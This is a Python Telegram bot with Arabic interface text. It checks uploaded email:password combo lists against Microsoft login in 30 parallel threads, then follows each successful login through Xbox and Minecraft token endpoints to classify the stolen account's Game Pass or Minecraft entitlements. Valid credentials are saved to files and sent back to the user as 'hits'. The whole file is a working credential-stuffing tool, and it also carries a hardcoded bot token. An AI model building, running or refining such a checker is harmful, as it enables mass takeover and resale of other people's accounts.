import os
import re
import time
import threading
import concurrent.futures
from urllib.parse import urlparse, parse_qs
import requests
import urllib3
import telebot
from telebot import types

urllib3.disable_warnings()

# ══════════════════════════════════════════════
# إعدادات البوت والقناة والحقوق
BOT_TOKEN = "8896382526:AAFMror2dFQ1U0r6RRHrrya2PKuyuoTRtnw"
CHANNEL_USERNAME = "@r1iv_k"  # قناة الاشتراك الإجباري
WELCOME_VIDEO_URL = "https://t.me/QuatrHuit/2"
MY_SIGNATURE = "@r1ivk"  # حقوق البرمجة والأونر باسمك

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

SFTAG_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

MAX_RETRIES = 3
REQUEST_TIMEOUT = 10
THREAD_COUNT = 30

# ══════════════════════════════════════════════
# فئة الإحصائيات
class Stats:
    def __init__(self):
        self.reset()

    def reset(self):
        self.checked = 0
        self.hits = 0
        self.bad = 0
        self.twofa = 0
        self.errors = 0
        self.minecraft = 0
        self.gamepass = 0
        self.xbox = 0
        self.not_linked = 0
        self.retries = 0
        self.current_email = ""
        self.start_time = time.time()
        self._lock = threading.Lock()

    def get_cpm(self):
        elapsed = time.time() - self.start_time
        return int((self.checked / elapsed) * 60) if elapsed > 0 else 0

stats = Stats()

# ══════════════════════════════════════════════
# إدارة الملفات والنتائج
def create_folders():
    f = {
        "minecraft": "Results/Minecraft",
        "gamepass": "Results/GamePass",
        "xbox": "Results/Xbox",
        "not_linked": "Results/HitNotLinked",
        "twofa": "Results/2FA",
    }
    for path in f.values():
        os.makedirs(path, exist_ok=True)
    return f

create_folders()

FILE_MAP = {
    "minecraft": "Results/Minecraft/Minecraft-hits.txt",
    "gamepass": "Results/GamePass/game_pass-hits.txt",
    "xbox": "Results/Xbox/xbox-hits.txt",
    "not_linked": "Results/HitNotLinked/not_linked.txt",
    "twofa": "Results/2FA/2fa.txt",
}

def save_hit(category, content):
    path = FILE_MAP.get(category)
    if path:
        try:
            with open(path, 'a', encoding='utf-8') as f:
                f.write(content + '\n')
        except:
            pass

def clear_results():
    for path in FILE_MAP.values():
        if os.path.exists(path):
            try:
                os.remove(path)
            except:
                pass

# ══════════════════════════════════════════════
# فحص الاشتراك الإجباري
def check_user_subscription(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        if member.status in ['member', 'administrator', 'creator']:
            return True
    except:
        pass
    return False

def subscription_markup():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("📢 اشترك في القناة", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}"))
    markup.add(types.InlineKeyboardButton("🔄 تحقق من الاشتراك", callback_data="check_sub"))
    return markup

# ══════════════════════════════════════════════
# دوال المصادقة وفحص الحسابات
def get_sftag(session, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
            text = response.text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sftag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sftag
        except:
            pass
        time.sleep(0.5)
    return None, None

def microsoft_auth(session, email, password, url_post, sftag, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            login_request = session.post(
                url_post, data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=True, timeout=REQUEST_TIMEOUT
            )
            if '#' in login_request.url and login_request.url != SFTAG_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, "success"
            elif any(v in login_request.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"
            elif any(v in login_request.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                return None, "bad"
        except:
            with stats._lock: stats.retries += 1
            if attempt == max_attempts - 1:
                return None, "error"
        time.sleep(0.5)
    return None, "error"

def get_xbox_token(session, ms_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"
            }
            response = session.post(
                'https://user.auth.xboxlive.com/user/authenticate',
                json=payload,
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                data = response.json()
                xbox_token = data.get('Token')
                if xbox_token:
                    return xbox_token, data['DisplayClaims']['xui'][0]['uhs']
            elif response.status_code == 429:
                time.sleep(2); continue
        except:
            with stats._lock: stats.retries += 1
            if attempt == max_attempts - 1: return None, None
        time.sleep(0.5)
    return None, None

def get_xsts_token(session, xbox_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            payload = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"
            }
            response = session.post(
                'https://xsts.auth.xboxlive.com/xsts/authorize',
                json=payload,
                headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200: return response.json().get('Token')
            elif response.status_code == 429: time.sleep(2); continue
        except:
            with stats._lock: stats.retries += 1
            if attempt == max_attempts - 1: return None
        time.sleep(0.5)
    return None

def get_minecraft_token(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.post(
                'https://api.minecraftservices.com/authentication/login_with_xbox',
                json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                headers={'Content-Type': 'application/json'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200: return response.json().get('access_token')
            elif response.status_code == 429: time.sleep(2); continue
        except:
            with stats._lock: stats.retries += 1
            if attempt == max_attempts - 1: return None
        time.sleep(0.5)
    return None

def check_entitlements(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(
                'https://api.minecraftservices.com/entitlements/mcstore',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                text = response.text
                if 'product_game_pass_ultimate' in text:
                    return 'Xbox Game Pass Ultimate', ["Xbox Game Pass Ultimate"]
                elif 'product_game_pass_pc' in text:
                    return 'Xbox Game Pass', ["Xbox Game Pass"]
                elif '"product_minecraft"' in text:
                    return 'Minecraft', ["Minecraft Java"]
                else:
                    others = []
                    if 'product_minecraft_bedrock' in text: others.append("Bedrock")
                    if 'product_legends' in text: others.append("Legends")
                    if 'product_dungeons' in text: others.append("Dungeons")
                    if others: return 'Xbox: ' + ', '.join(others), others
                    return None, []
            elif response.status_code == 429:
                time.sleep(2); continue
            else:
                return None, []
        except:
            with stats._lock: stats.retries += 1
            if attempt == max_attempts - 1: return None, []
        time.sleep(0.5)
    return None, []

def get_profile(session, mc_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            response = session.get(
                'https://api.minecraftservices.com/minecraft/profile',
                headers={'Authorization': f'Bearer {mc_token}'},
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:   return response.json()
            elif response.status_code == 404: return None
            elif response.status_code == 429: time.sleep(2); continue
        except:
            with stats._lock: stats.retries += 1
            if attempt == max_attempts - 1: return None
        time.sleep(0.5)
    return None

def get_xbox_profile(session, uhs, xsts_token, max_attempts=MAX_RETRIES):
    for attempt in range(max_attempts):
        try:
            auth_header = f"XBL3.0 x={uhs};{xsts_token}"
            response = session.get(
                "https://profile.xboxlive.com/users/me/profile/settings"
                "?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep",
                headers={
                    "Authorization": auth_header,
                    "x-xbl-contract-version": "2",
                    "Accept": "application/json",
                    "Accept-Language": "en-US",
                },
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                data = response.json()
                settings = {
                    s["id"]: s.get("value", "N/A")
                    for s in data.get("profileUsers", [{}])[0].get("settings", [])
                }
                return {
                    "gamertag": settings.get("Gamertag", "N/A"),
                    "gamerpic": settings.get("GameDisplayPicRaw", ""),
                    "tier": settings.get("AccountTier", "N/A"),
                    "rep": settings.get("XboxOneRep", "N/A"),
                }
            elif response.status_code == 429:
                time.sleep(2); continue
        except:
            pass
        time.sleep(0.3)
    return {"gamertag": "N/A", "gamerpic": "", "tier": "N/A", "rep": "N/A"}

# ══════════════════════════════════════════════
def check_account(combo, chat_id):
    try:
        parts = combo.strip().split(':')
        if len(parts) < 2:
            with stats._lock: stats.bad += 1; stats.checked += 1
            return

        email = parts[0]
        password = ':'.join(parts[1:])
        with stats._lock: stats.current_email = email

        session = requests.Session()
        session.verify = False

        url_post, sftag = get_sftag(session)
        if not url_post or not sftag:
            with stats._lock: stats.errors += 1; stats.checked += 1
            return

        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)

        if auth_status == "2fa":
            with stats._lock: stats.twofa += 1; stats.checked += 1
            save_hit("twofa", f"{email}:{password}")
            return
        elif auth_status == "bad":
            with stats._lock: stats.bad += 1; stats.checked += 1
            return
        elif auth_status != "success" or not ms_token:
            with stats._lock: stats.errors += 1; stats.checked += 1
            return

        xbox_token, uhs = get_xbox_token(session, ms_token)
        if not xbox_token or not uhs:
            with stats._lock: stats.bad += 1; stats.checked += 1
            return

        xsts_token = get_xsts_token(session, xbox_token)
        if not xsts_token:
            with stats._lock: stats.bad += 1; stats.checked += 1
            return

        xbox_profile = get_xbox_profile(session, uhs, xsts_token)
        gamertag = xbox_profile.get("gamertag", "N/A")
        tier = xbox_profile.get("tier", "N/A")
        rep = xbox_profile.get("rep", "N/A")

        mc_token = get_minecraft_token(session, uhs, xsts_token)
        if not mc_token:
            with stats._lock: stats.bad += 1; stats.checked += 1
            return

        account_type, subs = check_entitlements(session, mc_token)

        if not account_type:
            with stats._lock:
                stats.not_linked += 1; stats.hits += 1; stats.checked += 1
            capture = f"Email: {email} | Pass: {password} | Gamertag: {gamertag} | Type: Not Linked"
            save_hit("not_linked", capture)
            bot.send_message(chat_id, f"🔓 <b>HIT (Not Linked)!</b>\n<code>{email}:{password}</code>\nGamertag: {gamertag}\n\n⚡️ Developer: {MY_SIGNATURE}")
            return

        profile = get_profile(session, mc_token)
        name = profile.get('name', 'N/A') if profile else "Not Set"
        uuid = profile.get('id', 'N/A') if profile else "N/A"
        capes = ", ".join([c["alias"] for c in profile.get("capes", [])]) if profile else "None"
        subs_str = ", ".join(subs) if subs else "None"

        capture = f"Email: {email} | Pass: {password} | Type: {account_type} | MC: {name}"

        if 'Ultimate' in account_type or 'Game Pass' in account_type:
            with stats._lock: stats.gamepass += 1
            save_hit("gamepass", capture)
        elif 'Minecraft' in account_type:
            with stats._lock: stats.minecraft += 1
            save_hit("minecraft", capture)
        else:
            with stats._lock: stats.xbox += 1
            save_hit("xbox", capture)

        with stats._lock:
            stats.hits += 1; stats.checked += 1

        hit_msg = (
            f"✅ <b>HIT FOUND! ({account_type})</b>\n"
            f"📧 <code>{email}:{password}</code>\n"
            f"⛏ MC Name: {name}\n"
            f"🎭 Capes: {capes}\n"
            f"🎮 Gamertag: {gamertag}\n\n"
            f"⚡️ Developer: {MY_SIGNATURE}"
        )
        bot.send_message(chat_id, hit_msg)

    except Exception:
        with stats._lock: stats.errors += 1; stats.checked += 1

# ══════════════════════════════════════════════
# أوامر التليجرام
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if not check_user_subscription(user_id):
        bot.send_message(
            message.chat.id,
            f"⚠️ <b>يجب عليك الاشتراك في قناة البوت أولاً لتتمكن من استخدامه!</b>\n\nقناة البوت: {CHANNEL_USERNAME}",
            reply_markup=subscription_markup()
        )
        return

    welcome_text = (
        "🎮 <b>مرحباً بك في بوت فحص حسابات مايكروسوفت و ماينكرافت</b>\n\n"
        "📁 <b>طريقة الاستخدام:</b>\n"
        "• قم بإرسال ملف الكومبو بصيغة <code>.txt</code> وسيبدأ الفحص تلقائياً.\n\n"
        f"📢 القناة: {CHANNEL_USERNAME}\n"
        f"🛠️ Developer / Owner: {MY_SIGNATURE}"
    )
    try:
        bot.send_video(message.chat.id, WELCOME_VIDEO_URL, caption=welcome_text)
    except:
        bot.send_message(message.chat.id, welcome_text)

@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
def callback_check_sub(call):
    user_id = call.from_user.id
    if check_user_subscription(user_id):
        bot.answer_callback_query(call.id, "✅ تم التحقق من اشتراكك بنجاح!", show_alert=True)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        send_welcome(call.message)
    else:
        bot.answer_callback_query(call.id, "❌ لم تقم بالاشتراك في القناة بعد!", show_alert=True)

@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id
    if not check_user_subscription(user_id):
        bot.send_message(
            message.chat.id,
            f"⚠️ يجب عليك الاشتراك في القناة أولاً: {CHANNEL_USERNAME}",
            reply_markup=subscription_markup()
        )
        return

    file_info = bot.get_file(message.document.file_id)
    if not file_info.file_path.endswith('.txt'):
        bot.reply_to(message, "❌ يرجى إرسال ملف نصي بصيغة <code>.txt</code> فقط.")
        return

    downloaded_file = bot.download_file(file_info.file_path)
    combo_path = f"temp_{user_id}.txt"
    
    with open(combo_path, 'wb') as f:
        f.write(downloaded_file)

    with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if line.strip() and ':' in line]

    if os.path.exists(combo_path):
        os.remove(combo_path)

    total = len(combos)
    if total == 0:
        bot.reply_to(message, "❌ الملف فارغ أو لا يحتوي على صيغ كومبو صحيحة (email:pass).")
        return

    clear_results()
    stats.reset()

    bot.send_message(message.chat.id, f"🚀 <b>جاري بدء الفحص لـ {total} حساب...</b>\n\n🛠️ By: {MY_SIGNATURE}")

    def run_checker():
        with concurrent.futures.ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
            futures = {executor.submit(check_account, c, message.chat.id): c for c in combos}
            for _ in concurrent.futures.as_completed(futures):
                pass

        final_text = (
            f"✅ <b>انتهى الفحص بنجاح!</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 إجمالي الفحص: {stats.checked}\n"
            f"✅ الناجح (Hits): {stats.hits}\n"
            f"❌ الخاطئ (Bad): {stats.bad}\n"
            f"🔒 تحقق (2FA): {stats.twofa}\n"
            f"⚠️ أخطاء: {stats.errors}\n"
            f"━━━━━━━━━━━━━━━━━━━━\n"
            f"⛏ ماينكرافت: {stats.minecraft}\n"
            f"🎮 جيم باس: {stats.gamepass}\n"
            f"🕹 إكس بوكس: {stats.xbox}\n"
            f"🔓 غير مرتبط: {stats.not_linked}\n\n"
            f"🛠️ Dev: {MY_SIGNATURE}"
        )
        bot.send_message(message.chat.id, final_text)

        for cat, path in FILE_MAP.items():
            if os.path.exists(path) and os.path.getsize(path) > 0:
                with open(path, 'rb') as doc:
                    bot.send_document(message.chat.id, doc, caption=f"📁 نتائج {cat}\n🛠️ {MY_SIGNATURE}")
                time.sleep(0.5)

    threading.Thread(target=run_checker, daemon=True).start()

if __name__ == "__main__":
    print("Bot is running...")
    bot.infinity_polling()
